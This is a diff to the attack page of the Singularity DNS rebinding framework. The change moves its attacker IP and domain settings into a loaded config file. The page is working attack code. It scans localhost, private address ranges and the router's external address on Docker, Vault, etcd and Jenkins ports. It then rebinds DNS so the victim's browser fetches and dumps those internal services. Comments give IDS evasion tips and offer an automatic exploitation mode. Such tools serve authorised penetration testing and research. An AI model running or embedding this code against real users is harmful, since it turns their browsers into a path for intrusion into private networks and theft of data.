@@ -18,150 +18,167 @@
 <body id="body" style="display: none">
     The home page of vulnerable services will be dumped in the browser developer console.
     <script>
-        const configuration = {
-            attackHostIPAddress: '35.185.206.165', // CHANGE THIS to your attacking server IP address.
-            attackHostDomain: 'd.rebind.it', // CHANGE THIS to your attacker domain.
+        // Load configuration from manager-config.json
+        let configuration = {};
 
-            /* Rebinding Strategy section*/
-            // Select one of these strategy per target:
+        // Fetch configuration from manager-config.json
+        fetch('/manager-config.json')
+            .then(response => response.json())
+            .then(config => {
+                configuration = {
+                    attackHostIPAddress: config.attackHostIPAddress,
+                    attackHostDomain: config.attackHostDomain,
 
-            // "FromQueryFirstThenSecond": 
-            // Default, conservative. Use interval: "20" when choosing this strategy.
-            rebindingStrategy: 'fs',
+                    /* Rebinding Strategy section*/
+                    // Select one of these strategy per target:
 
-            // "FromQueryMultiA": 
-            // Multiple DNS answers (fast)
-            // Rebinding in approximately 3 sec. Use interval: "1" when choosing this strategy.
-            // Works against localhost only, specifically:
-            // 0.0.0.0 when target is Linux/macos/Unix, and 127.0.0.1 when target is Windows based. 
-            // rebindingStrategy: 'ma',
+                    // "FromQueryFirstThenSecond": 
+                    // Default, conservative. Use interval: "20" when choosing this strategy.
+                    rebindingStrategy: config.rebindingStrategy,
 
-            // "FromQueryRoundRobin": 
-            // Round robin. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
-            // Use for IPS/filters evasion or when DNS requests arrive out of sync.
-            // rebindingStrategy: 'rr',
+                    // "FromQueryMultiA": 
+                    // Multiple DNS answers (fast)
+                    // Rebinding in approximately 3 sec. Use interval: "1" when choosing this strategy.
+                    // Works against localhost only, specifically:
+                    // 0.0.0.0 when target is Linux/macos/Unix, and 127.0.0.1 when target is Windows based. 
+                    // rebindingStrategy: 'ma',
 
-            // "FromQueryRandom": 
-            // Random. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
-            //  Use for IPS/filters evasion or when DNS requests arrive out of sync.
-            // rebindingStrategy: 'rd',
+                    // "FromQueryRoundRobin": 
+                    // Round robin. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
+                    // Use for IPS/filters evasion or when DNS requests arrive out of sync.
+                    // rebindingStrategy: 'rr',
 
-            /* Rebinding Strategy section ends*/
+                    // "FromQueryRandom": 
+                    // Random. Slower. Use for IPS/filters evasion or when DNS requests arrive out of sync.
+                    //  Use for IPS/filters evasion or when DNS requests arrive out of sync.
+                    // rebindingStrategy: 'rd',
 
-            // Choose one of Singularity's attack payload to deliver to the victim host or write your own.
-            // 'Simple Fetch Get' fetches the '/' page of target and log it to the console.
-            attackPayload: 'Simple Fetch Get',
-            // 'automatic' will attempt to detect services and automatically exploit them
-            // with all payloads available to Singularity!
-            //attackPayload: 'automatic',
+                    /* Rebinding Strategy section ends*/
 
-            // Interval in second to retry detecting a successful rebind. 
-            // Use "20" for all rebinding strategies except for "FromQueryMultiA", where "1" will work.
-            interval: "20",
+                    // Choose one of Singularity's attack payload to deliver to the victim host or write your own.
+                    // 'Simple Fetch Get' fetches the '/' page of target and log it to the console.
+                    attackPayload: 'Simple Fetch Get',
+                    // 'automatic' will attempt to detect services and automatically exploit them
+                    // with all payloads available to Singularity!
+                    //attackPayload: 'automatic',
 
-            // Attack using the Fetch API ('fetch'), or iframes ('iframe')
-            // Fetch API works with most browsers, but is blocked by Chrome by most (but not all) target configurations. 
-            // Inline Frame should work with most browsers, unless the target application does not allow rendering in an iframe.
-            attackMethod: 'fetch',
+                    // Interval in second to retry detecting a successful rebind. 
+                    // Use "20" for all rebinding strategies except for "FromQueryMultiA", where "1" will work.
+                    interval: config.interval,
 
-            // Flush Chrome DNS browser cache to improve DNS Rebinding attack speed.
-            flushDns: false,
+                    // Attack using the Fetch API ('fetch'), or iframes ('iframe')
+                    // Fetch API works with most browsers, but is blocked by Chrome by most (but not all) target configurations. 
+                    // Inline Frame should work with most browsers, unless the target application does not allow rendering in an iframe.
+                    attackMethod: config.attackMethod,
 
-            // One of several tricks to determine 
-            // whether we are pointing against the attacker or the victim domain.
-            indexToken: "<!--thisismytesttoken-->",
+                    // Flush Chrome DNS browser cache to improve DNS Rebinding attack speed.
+                    flushDns: config.flushDns,
 
-            // Change the Websockets / Proxy port if you started Singularity with a different value.
-            wsProxyPort: 3129,
+                    // One of several tricks to determine 
+                    // whether we are pointing against the attacker or the victim domain.
+                    indexToken: config.indexToken,
 
-            // show a blank page or not.
-            hideActivity: false,
+                    // Change the Websockets / Proxy port if you started Singularity with a different value.
+                    wsProxyPort: config.wsProxyPort,
 
-            // Rebind a headless browser. Default is false.
-            delayDOMLoad: false,
-        };
+                    // show a blank page or not.
+                    hideActivity: false,
 
-        // Set the callback on successful rebinding a frame
-        // msg contains a frame msg
-        configuration.rebindingSuccessFn = (msg) => {
-            console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
-        }
+                    // Rebind a headless browser. Default is false.
+                    delayDOMLoad: false,
+                };
 
-        //Update the Singularity app configuration
-        app.getConfiguration().setManually(configuration);
+                // Set the callback on successful rebinding a frame
+                // msg contains a frame msg
+                configuration.rebindingSuccessFn = (msg) => {
+                    console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
+                }
 
-        // Specify the target address specification below.
-        // IDS evasion tricks - try the following targets: 
-        //   * "0.0.0.0" for Linux/macos/Unix platforms
-        //   * 127.0.0.2
-        //   * "localhost" for Firefox, Chrome
-        //   * a CNAME such as "jenkins.internal-organization-domain.local"
-        let addrSpec = `127.0.0.1,0.0.0.0`;
+                //Update the Singularity app configuration
+                app.getConfiguration().setManually(configuration);
 
-        // Specify whether Singularity should search for and attack more addresses
-        // that may be accessible by the target browser, *in addition* to the above targets.
-        // Further targets are currently discovered using:
-        //  - WebRTC address leak when available, and inference of the private net. addresses range
-        //  - detection of target router's external address
-        let searchForMoreAddresses = false;
+                // Initialize the attack after configuration is loaded
+                initializeAttack();
+            })
+            .catch(error => {
+                console.error('Failed to load configuration:', error);
+                document.getElementById("activity").innerHTML = "Error loading configuration. Please check manager-config.json";
+            });
 
-        // Specify a port range to scan and attack
-        // WARNING: You must ensure that Singularity listens on all these ports at startup for now.
-        const portSpec = '80,8080-8082,2376,8200,3000,4000,2379,9333';
+        function initializeAttack() {
+            // Specify the target address specification below.
+            // IDS evasion tricks - try the following targets: 
+            //   * "0.0.0.0" for Linux/macos/Unix platforms
+            //   * 127.0.0.2
+            //   * "localhost" for Firefox, Chrome
+            //   * a CNAME such as "jenkins.internal-organization-domain.local"
+            let addrSpec = `127.0.0.1,0.0.0.0`;
 
-        // When scanning for services, we need to implement two callbacks:
-        // scanFoundNewTargetCb() is invoked when a target was found to listen for HTTP requests on a given port.
-        function scanFoundNewTargetCb(result) {
-            console.log(result);
-            document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
+            // Specify whether Singularity should search for and attack more addresses
+            // that may be accessible by the target browser, *in addition* to the above targets.
+            // Further targets are currently discovered using:
+            //  - WebRTC address leak when available, and inference of the private net. addresses range
+            //  - detection of target router's external address
+            let searchForMoreAddresses = false;
 
-            // start DNS rebinding attack against target.
-            // we double encode dash "-" if we send a CNAME for singularity to exploit instead of an IP address.
-            // last parameter is set to true to optimize for speed if frame match certain conditions
-            app.attackTarget(result.target.address.replace("-", "--"), result.target.port, true);
-        }
+            // Specify a port range to scan and attack
+            // WARNING: You must ensure that Singularity listens on all these ports at startup for now.
+            const portSpec = '80,8080-8082,2376,8200,3000,4000,2379,9333';
 
-        // scanDoneCb() is invoked when the scan was completed.
-        function scanDoneCb(results) {
-            document.getElementById("activity").innerHTML += "Done.<br/>";
-            setTimeout(function () {
-                sm.shutDown();
-            }, 3000);
-            setTimeout(function () {
-                delaydomloadframe.src = "about:blank";
-            }, 90000);
-        }
+            // When scanning for services, we need to implement two callbacks:
+            // scanFoundNewTargetCb() is invoked when a target was found to listen for HTTP requests on a given port.
+            function scanFoundNewTargetCb(result) {
+                console.log(result);
+                document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
 
-        // Implement a sample attack
-        // if we can obtain our local IP address (Chrome and Firefox only), 
-        // Then scan 127.0.0.1, 0.0.0.0 and local_ip_address/24
-        // Otherwise scan 127.0.0.1, 0.0.0.0 and 192.168.1.1-254
-        // We also include our external IP address
-        // to exploit weak end system model in consumer/small business routers
-        // Then fetch '/' and log to console.
-        async function getLocalIpAddressesThenScan() {
-            sm = ScanManager();
-            const externalAddress = await getMyExternalIpAddress();
-            addrSpec = `${addrSpec},${externalAddress}`;
-            getLocalIpAddress()
-                .then(address => {
-                    const range = `${address.split('.', 3).join('.')}.1-254`;
-                    sm.run(`${addrSpec},${range}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
-                },
-                    e => {
-                        console.log(e);
-                        sm.run(`${addrSpec},192.168.1.1-254`, portSpec, scanFoundNewTargetCb, scanDoneCb);
+                // start DNS rebinding attack against target.
+                // we double encode dash "-" if we send a CNAME for singularity to exploit instead of an IP address.
+                // last parameter is set to true to optimize for speed if frame match certain conditions
+                app.attackTarget(result.target.address.replace("-", "--"), result.target.port, true);
+            }
 
-                    })
-        }
+            // scanDoneCb() is invoked when the scan was completed.
+            function scanDoneCb(results) {
+                document.getElementById("activity").innerHTML += "Done.<br/>";
+                setTimeout(function () {
+                    sm.shutDown();
+                }, 3000);
+                setTimeout(function () {
+                    delaydomloadframe.src = "about:blank";
+                }, 90000);
+            }
 
-        // and go!
+            // Implement a sample attack
+            // if we can obtain our local IP address (Chrome and Firefox only), 
+            // Then scan 127.0.0.1, 0.0.0.0 and local_ip_address/24
+            // Otherwise scan 127.0.0.1, 0.0.0.0 and 192.168.1.1-254
+            // We also include our external IP address
+            // to exploit weak end system model in consumer/small business routers
+            // Then fetch '/' and log to console.
+            async function getLocalIpAddressesThenScan() {
+                sm = ScanManager();
+                const externalAddress = await getMyExternalIpAddress();
+                addrSpec = `${addrSpec},${externalAddress}`;
+                getLocalIpAddress()
+                    .then(address => {
+                        const range = `${address.split('.', 3).join('.')}.1-254`;
+                        sm.run(`${addrSpec},${range}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
+                    },
+                        e => {
+                            console.log(e);
+                            sm.run(`${addrSpec},192.168.1.1-254`, portSpec, scanFoundNewTargetCb, scanDoneCb);
 
-        if (searchForMoreAddresses === true) {
-            getLocalIpAddressesThenScan();
-        } else {
-            sm = ScanManager();
-            sm.run(`${addrSpec}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
+                        })
+            }
+
+            // and go!
+
+            if (searchForMoreAddresses === true) {
+                getLocalIpAddressesThenScan();
+            } else {
+                sm = ScanManager();
+                sm.run(`${addrSpec}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
+            }
         }
     </script>
 
